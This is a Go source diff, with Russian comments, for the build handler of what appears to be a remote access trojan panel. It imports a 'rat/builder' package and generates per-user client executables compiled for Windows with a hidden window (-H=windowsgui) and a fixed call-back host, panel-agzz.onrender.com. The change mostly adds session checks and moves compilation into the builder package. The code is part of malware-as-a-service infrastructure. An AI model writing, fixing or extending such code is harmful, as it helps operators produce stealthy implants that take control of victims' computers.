@@ -8,7 +8,6 @@ import (
 	"log"
 	"net/http"
 	"os"
-	"os/exec"
 	"path/filepath"
 	"rat/builder"
 	"strings"
@@ -84,47 +83,52 @@ func main() {
 }
 
 func createBuildHandler(w http.ResponseWriter, r *http.Request) {
-	cookie, _ := r.Cookie("session")
+	// Получаем текущего пользователя из сессии
+	cookie, err := r.Cookie("session")
+	if err != nil {
+		http.Error(w, "unauthorized", http.StatusUnauthorized)
+		return
+	}
+
 	sessionsMu.RLock()
-	owner := sessions[cookie.Value]
+	owner, ok := sessions[cookie.Value]
 	sessionsMu.RUnlock()
 
+	if !ok {
+		http.Error(w, "unauthorized", http.StatusUnauthorized)
+		return
+	}
+
+	// Генерируем уникальный ID для билда
 	buildID := uuid.New().String()
+
+	// Создаем запись о билде
 	build := &Build{
 		ID:      buildID,
 		Owner:   owner,
-		Host:    "https://panel-agzz.onrender.com", // Фиксированный хост
+		Host:    "panel-agzz.onrender.com", // Фиксированный хост
 		Created: time.Now(),
 	}
 
+	// Сохраняем билд
 	buildsMu.Lock()
 	builds[buildID] = build
 	buildsMu.Unlock()
 
+	// Добавляем билд к пользователю
 	userBuildsMu.Lock()
 	userBuilds[owner] = append(userBuilds[owner], buildID)
 	userBuildsMu.Unlock()
 
-	// Генерируем клиент с фиксированным хостом
-	tmpDir := filepath.Join("builds", buildID)
-	_ = os.MkdirAll(tmpDir, 0755)
-	tmpFile := filepath.Join(tmpDir, "client.go")
-
-	code := strings.ReplaceAll(template, "YOUR_SERVER_IP", "panel-agzz.onrender.com")
-	if err := os.WriteFile(tmpFile, []byte(code), 0644); err != nil {
-		http.Error(w, "failed to create build file", http.StatusInternalServerError)
-		return
-	}
-
-	// Компилируем клиент
-	cmd := exec.Command("go", "build", "-ldflags", "-H=windowsgui", "-o", "client.exe", "client.go")
-	cmd.Dir = tmpDir
-	cmd.Env = append(os.Environ(), "CGO_ENABLED=1", "GOOS=windows", "GOARCH=amd64")
-	if err := builder.BuildClient("panel-agzz.onrender.com", buildID); err != nil {
+	// Вызываем builder для создания клиента
+	if err := builder.Build("panel-agzz.onrender.com", buildID); err != nil {
+		log.Printf("Build failed: %v", err)
 		http.Error(w, "build failed: "+err.Error(), http.StatusInternalServerError)
 		return
 	}
 
+	// Возвращаем ID билда
+	w.Header().Set("Content-Type", "application/json")
 	w.WriteHeader(http.StatusCreated)
 	json.NewEncoder(w).Encode(map[string]string{"id": buildID})
 }
